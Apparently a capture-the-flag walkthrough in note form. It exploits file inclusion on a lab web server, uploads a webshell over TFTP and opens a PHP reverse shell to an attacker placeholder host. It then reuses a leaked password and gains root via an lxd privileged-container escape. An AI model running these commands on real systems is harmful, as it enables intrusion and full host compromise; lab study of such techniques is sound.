we identified a webserver on port 880

in the url it said something file=home.php

thus we can try file inclusion
grabbing the /etc/passwd

we see an tftp user and its home folder is: /var/lib/tftpboot/


connecting with 
scanning for tftp:
sudo nmap -sU -sV -p 69 {boxip}

connecting and pushing wwwwolf webshell
tftp {boxip}
put webshell.php 


and then opening a webbrowser:
http://{boxip}/?file=/var/lib/tftpboot/webshell.php


turning on a listener:
nc -lvp 1234

on the website using a php revshehll:
php -r '$sock=fsockopen("{hackbox}",1234);shell_exec("sh <&3 >&3 2>&3");'

this got us a bad shell, so lets upgrade it:
python3 -c 'import pty;pty.spawn("/bin/bash")'


in the sites folder we see a .passwd file with mikes credentials:
cat /var/www/html/.htpasswd
mike:Sheffield19
su mike

using groups and id we see that mike is in the lxd group

thus we can use lxd to get access to the root

we can locally prepare a small container with alpine:
cd alpintest
sudo apt install distrobuilder -y
sudo distrobuilder build-lxd alpine.yaml -o image.release=3.18

then we can push it to the box with the tftp:
tftp {boxip}
put incus.tar.xz
put rootfs.squashfs
quit

lxc image import incus.tar.xz rootfs.squashfs --alias alpine
lxc iamge list
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

and the flag could be found:
cat /mnt/root/root/root.txt